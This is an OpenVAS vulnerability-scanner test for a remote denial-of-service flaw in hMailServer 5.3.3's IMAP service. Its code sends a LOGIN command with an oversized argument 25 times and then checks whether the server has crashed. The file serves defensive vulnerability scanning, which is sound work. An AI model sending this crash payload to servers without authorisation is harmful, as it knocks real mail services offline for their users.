##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hmailserver_imap_dos_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# hMailServer IMAP Remote Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902929");
  script_version("$Revision: 4690 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-10-29 13:43:35 +0530 (Mon, 29 Oct 2012)");
  script_name("hMailServer IMAP Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/imap", 143);

  script_xref(name:"URL", value:"http://1337day.com/exploit/19642");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/22302/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/117723/hmailserver-dos.txt");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/10/hmailserver-533-imap-remote-crash-poc.html");

  tag_impact = "Successful exploitation will allow the attacker to cause denial
  of service.

  Impact Level: Application";

  tag_affected = "hMailServer Version 5.3.3  Build 1879";

  tag_insight = "This flaw is due to an error within the IMAP server when handling
  a long argument to the 'LOGIN' command.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "This host is running hMailServer and is prone to denial of service
  vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("imap_func.inc");

port = "";
soc = "";
soc2 = "";
res = "";

## Get the default port
port = get_kb_item("Services/imap");
if(!port) {
  port = 143;
}

## Check the port status
if(!get_port_state(port)) {
  exit(0);
}

## Confirm the application through banner
if("* OK IMAPrev1" >!< get_imap_banner(port:port)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct the crafted request
data = string("a LOGIN ", crap(length:32755, data:"A"),
              " AAAAAAAA\r\n", "a LOGOUT\r\n");

## Send the crafted request multiple times
for(i=0;i<25;i++){
  send(socket:soc, data:data);
}

recv(socket:soc, length:4096);

##close the socket
close(soc);

## Delay
sleep(5);

## Open the socket again  after sending crafted data
soc2 = open_sock_tcp(port);
if(soc2)
{
  res =   recv(socket:soc2, length:4096);
  ## Confirm if server is not responding anything its died
  if ("* OK IMAPrev1" >!< res)
  {
    security_message(port:port);
    close(soc2);
    exit(0);
  }
}
else
{
  ## if socket creation fails server is died
  security_message(port);
}
